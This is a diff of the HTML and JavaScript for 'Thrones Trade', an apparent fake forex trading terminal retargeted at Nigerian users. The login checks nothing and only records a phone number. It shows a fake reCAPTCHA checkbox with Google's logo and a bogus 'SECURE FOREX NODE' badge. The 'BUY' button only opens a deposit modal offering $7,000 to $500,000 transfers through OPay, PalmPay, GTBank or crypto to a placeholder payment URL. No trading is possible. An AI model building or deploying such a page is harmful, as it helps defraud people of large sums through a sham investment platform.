@@ -3,155 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thrones Trade | Global Banking Terminal</title>
+    <title>Trade | Thrones Global Forex Terminal</title>
+    <meta name="description" content="Secure Forex and Stock Trading Terminal. Execute global trades instantly.">
+    <meta name="keywords" content="trade, forex, stock, crypto, nigeria trade, opay trading">
+
     <style>
         :root { --bg: #06090f; --panel: #121824; --green: #00ff88; --red: #ff3b3b; --accent: #c1a461; --text: #f0f2f5; --border: #1e2633; }
-        
         @keyframes led-glow { 0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 50% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; } 100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } }
-        
         body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; height: 100vh; overflow: hidden; border: 4px solid #f00; animation: led-glow 5s infinite; box-sizing: border-box; }
 
-        /* LOGIN SCREEN */
+        /* MODALS */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100000; display: none; align-items: center; justify-content: center; }
+        .modal-card { background: var(--panel); padding: 25px; border-radius: 12px; border: 1px solid var(--accent); width: 340px; text-align: center; }
+        
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--border); color: white; border-radius: 6px; }
+        .amt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 10px 0; }
+        .amt-btn { padding: 10px; background: #000; border: 1px solid var(--border); color: var(--green); cursor: pointer; border-radius: 4px; font-weight: bold; font-size: 12px; }
+        
+        /* LOGIN & UI */
         #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 99999; display: flex; align-items: center; justify-content: center; }
-        .login-card { background: var(--panel); width: 340px; padding: 30px; border-radius: 12px; border: 2px solid var(--accent); text-align: center; }
+        .classic-captcha { display: flex; align-items: center; justify-content: space-between; background: #f9f9f9; color: #555; padding: 8px; border-radius: 3px; border: 1px solid #d3d3d3; margin: 10px 0; font-size: 12px; text-align: left; }
+        .btn-action { width: 100%; padding: 14px; background: var(--accent); color: black; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; }
+
+        header { background: var(--panel); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
+        .app-shell { display: flex; height: calc(100vh - 55px); }
+        .sidebar-right { width: 320px; background: var(--panel); border-left: 1px solid var(--border); padding: 15px; }
         
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        .pass-wrapper { position: relative; width: 100%; display: flex; align-items: center; }
-        .toggle-btn { position: absolute; right: 10px; background: none; border: none; color: var(--accent); font-size: 10px; font-weight: bold; cursor: pointer; z-index: 10; }
-
-        /* CLASSIC RECAPTCHA */
-        .classic-captcha { display: flex; align-items: center; justify-content: space-between; background: #f9f9f9; color: #555; padding: 10px 15px; border-radius: 3px; border: 1px solid #d3d3d3; margin: 15px 0; text-align: left; }
-        .captcha-left { display: flex; align-items: center; font-size: 14px; }
-        .captcha-left input { width: 22px !important; height: 22px !important; margin-right: 10px !important; }
-
-        .btn-enter { width: 100%; padding: 14px; background: var(--accent); color: black; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; }
-
-        /* DEPOSIT MODAL */
-        #depositModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100000; display: none; align-items: center; justify-content: center; }
-        .modal-content { background: var(--panel); padding: 30px; border-radius: 15px; border: 2px solid var(--accent); width: 350px; text-align: center; box-shadow: 0 0 30px rgba(193, 164, 97, 0.4); }
-        .amt-btn { width: 100%; padding: 12px; margin: 4px 0; background: #000; border: 1px solid var(--border); color: var(--green); font-weight: bold; cursor: pointer; border-radius: 6px; }
-        .amt-btn:hover { border-color: var(--green); }
-
-        /* MAIN UI */
-        header { background: var(--panel); padding: 10px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
-        .app-shell { display: flex; height: calc(100vh - 50px); }
-        .center-stack { flex: 1; background: #000; display: flex; flex-direction: column; }
-        .sidebar-right { width: 300px; background: var(--panel); border-left: 1px solid var(--border); padding: 15px; display: flex; flex-direction: column; gap: 10px; }
-        
-        .trade-btn { height: 60px; border-radius: 8px; border: none; cursor: pointer; color: white; font-weight: 900; margin-bottom: 5px; }
-        .up { background: var(--green); color: black; }
-        .sell { background: var(--red); }
+        .wallet-info { background: #000; padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="depositModal">
-        <div class="modal-content">
-            <h3 style="color:var(--accent); margin-bottom:5px;">FUNDING PORTAL</h3>
-            <p style="font-size: 10px; color: #888; margin-bottom: 15px;">Choose Bank & Amount</p>
-            
+    <div id="depositModal" class="overlay">
+        <div class="modal-card">
+            <h3 style="color:var(--accent)">FUND WALLET</h3>
             <select id="bankSelect">
-                <option value="" disabled selected>-- Select Your Bank --</option>
-                <option value="Chase">JPMorgan Chase</option>
-                <option value="BoA">Bank of America</option>
-                <option value="Wells">Wells Fargo</option>
-                <option value="Citibank">Citibank</option>
-                <option value="HSBC">HSBC Holdings</option>
-                <option value="Barclays">Barclays</option>
-                <option value="Crypto">Crypto Wallet (BTC/USDT)</option>
-                <option value="Other">International Wire Transfer</option>
+                <option value="" disabled selected>-- Select Bank --</option>
+                <optgroup label="Nigeria Online Banks">
+                    <option value="OPay">OPay Digital</option>
+                    <option value="PalmPay">PalmPay</option>
+                    <option value="Kuda">Kuda Microfinance</option>
+                    <option value="Moniepoint">Moniepoint</option>
+                </optgroup>
+                <optgroup label="Nigeria Commercial Banks">
+                    <option value="GTBank">GTBank</option>
+                    <option value="Zenith">Zenith Bank</option>
+                    <option value="Access">Access Bank</option>
+                    <option value="FirstBank">First Bank Nigeria</option>
+                </optgroup>
+                <optgroup label="International">
+                    <option value="Barclays">Barclays (UK/INT)</option>
+                    <option value="HSBC">HSBC (GLOBAL)</option>
+                    <option value="Crypto">USDT / BTC Wallet</option>
+                </optgroup>
             </select>
 
-            <div style="margin: 10px 0;">
-                <button class="amt-btn" onclick="confirmDeposit(7000)">$7,000.00</button>
-                <button class="amt-btn" onclick="confirmDeposit(15000)">$15,000.00</button>
-                <button class="amt-btn" onclick="confirmDeposit(30000)">$30,000.00</button>
-                <button class="amt-btn" onclick="confirmDeposit(50000)">$50,000.00</button>
-                <button class="amt-btn" onclick="confirmDeposit(100000)" style="color:#ffd700;">$100,000.00 (VIP)</button>
-                <button class="amt-btn" onclick="confirmDeposit(250000)" style="color:#ffd700;">$250,000.00 (PRO)</button>
+            <div class="amt-grid">
+                <button class="amt-btn" onclick="confirmDeposit(7000)">$7,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(50000)">$50,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(100000)">$100,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(200000)">$200,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(300000)">$300,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(500000)">$500,000</button>
             </div>
-
-            <button onclick="document.getElementById('depositModal').style.display='none'" style="background:none; border:none; color:#555; cursor:pointer; font-size:11px;">Cancel Transaction</button>
+            <button onclick="hideDeposit()" style="background:none; border:none; color:#555; cursor:pointer; font-size:10px;">CANCEL</button>
         </div>
     </div>
 
     <div id="loginScreen">
-        <div class="login-card">
-            <h2 style="color:var(--accent); margin-bottom:20px;">THRONES TRADE</h2>
+        <div class="modal-card">
+            <h2 style="color:var(--accent); margin-bottom:15px;">THRONES TRADE</h2>
             <form onsubmit="doLogin(event)">
-                <input type="text" id="uID" name="username" placeholder="Trader ID" required autocomplete="username">
-                <div class="pass-wrapper">
-                    <input type="password" id="uPass" name="password" placeholder="Password" required autocomplete="current-password">
-                    <button class="toggle-btn" type="button" onclick="handleToggle()">SHOW</button>
+                <input type="text" id="uID" placeholder="Trader ID" required autocomplete="username">
+                <input type="tel" id="uPhone" placeholder="Phone Number (e.g. 08153609706)" required>
+                <div style="position:relative">
+                    <input type="password" id="uPass" placeholder="Password" required autocomplete="current-password">
                 </div>
-                
                 <div class="classic-captcha">
-                    <div class="captcha-left"><input type="checkbox" required> <span>I'm not a robot</span></div>
-                    <div style="font-size:8px; color:#999; text-align:center;">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" width="25"><br>reCAPTCHA
+                    <div style="display:flex; align-items:center;">
+                        <input type="checkbox" required style="width:20px; margin-right:10px;"> <span>I'm not a robot</span>
                     </div>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" width="25">
                 </div>
-                <button class="btn-enter" type="submit">PROCEED</button>
+                <button class="btn-action" type="submit">PROCEED</button>
             </form>
         </div>
     </div>
 
     <header>
         <div style="font-weight:900; color:var(--accent); font-size: 18px;">THRONES <span style="color:white">TRADE</span></div>
-        <div id="badge" style="font-size: 10px; color: var(--green);">● SECURE BANKING LINK</div>
+        <div style="font-size: 10px; color: var(--green);">● SECURE FOREX NODE</div>
     </header>
 
     <div class="app-shell">
-        <div class="center-stack">
-            <div style="flex: 2; border-bottom: 1px solid var(--border);">
+        <div style="flex:1; display:flex; flex-direction:column;">
+            <div style="flex:2; border-bottom: 1px solid var(--border);">
                 <div id="tv_chart" style="height:100%;"></div>
                 <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
                 <script type="text/javascript">
-                    new TradingView.widget({ "autosize": true, "symbol": "BINANCE:BTCUSDT", "theme": "dark", "container_id": "tv_chart" });
+                    new TradingView.widget({ "autosize": true, "symbol": "FX:EURUSD", "theme": "dark", "container_id": "tv_chart" });
                 </script>
             </div>
-            <div style="flex: 1; background: var(--panel);">
+            <div style="flex:1; background: var(--panel);">
                 <iframe src="https://www3.cbox.ws/box/?boxid=3541705&boxtag=thronestrade" width="100%" height="100%" frameborder="0"></iframe>
             </div>
         </div>
 
         <div class="sidebar-right">
-            <div style="background:#000; padding:15px; border-radius:8px; border:1px solid var(--border);">
-                <div style="font-size: 9px; color: #444;">TRADING EQUITY</div>
-                <div id="balance" style="font-size: 20px; font-weight: 900; color: var(--red);">$0.00</div>
+            <div class="wallet-info">
+                <div style="font-size: 9px; color: #444; margin-bottom:5px;">TRADER WALLET</div>
+                <div id="displayPhone" style="font-size: 11px; color: var(--accent); margin-bottom: 5px;">ID: ---</div>
+                <div id="balance" style="font-size: 24px; font-weight: 900; color: var(--red);">$0.00</div>
                 <button onclick="showDeposit()" style="width:100%; margin-top:10px; padding:8px; background:var(--accent); border:none; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold;">+ ADD FUNDS</button>
             </div>
-            <button class="trade-btn up" onclick="showDeposit()">▲ CALL / BUY</button>
-            <button class="trade-btn sell" onclick="window.location.href='https://YOUR_SELL_SITE.com'">✖ SELL OUT</button>
+            
+            <div style="font-size: 9px; color: #6a737d; margin: 10px 0;">MARKET ACTIONS</div>
+            <button class="btn-action" style="background:var(--green); margin-bottom:8px;" onclick="showDeposit()">▲ BUY / CALL</button>
+            <button class="btn-action" style="background:var(--red); color:white;" onclick="window.location.href='https://YOUR_SELL_SITE.com'">✖ SELL OUT</button>
         </div>
     </div>
 
     <script>
-        function showDeposit() {
-            document.getElementById('depositModal').style.display = 'flex';
-        }
+        function showDeposit() { document.getElementById('depositModal').style.display = 'flex'; }
+        function hideDeposit() { document.getElementById('depositModal').style.display = 'none'; }
 
-        function handleToggle() {
-            const p = document.getElementById("uPass");
-            p.type = p.type === "password" ? "text" : "password";
-        }
-
-        function confirmDeposit(amount) {
+        function confirmDeposit(amt) {
             const bank = document.getElementById('bankSelect').value;
-            if(!bank) { alert("Please select a bank first."); return; }
-            
-            alert("Connecting to " + bank + " secure portal for $" + amount.toLocaleString() + " transfer...");
-            window.location.href = "https://YOUR_PAYMENT_PAGE.com?amount=" + amount + "&bank=" + bank;
+            if(!bank) { alert("Please select a Bank (OPay, PalmPay, etc) first."); return; }
+            alert("Connecting to " + bank + " for $" + amt.toLocaleString() + " transfer...");
+            window.location.href = "https://YOUR_PAYMENT_PAGE.com?amount=" + amt + "&bank=" + bank;
         }
 
         function doLogin(e) {
             e.preventDefault();
-            localStorage.setItem('tradeAuth', document.getElementById('uID').value);
+            const phone = document.getElementById('uPhone').value;
+            localStorage.setItem('tradeAuth', phone);
+            document.getElementById('displayPhone').innerText = "WALLET ID: " + phone;
             document.getElementById('loginScreen').style.display = 'none';
         }
 
         window.onload = function() {
-            if(localStorage.getItem('tradeAuth')) document.getElementById('loginScreen').style.display = 'none';
+            const saved = localStorage.getItem('tradeAuth');
+            if(saved) {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('displayPhone').innerText = "WALLET ID: " + saved;
+            }
         }
     </script>
 </body>
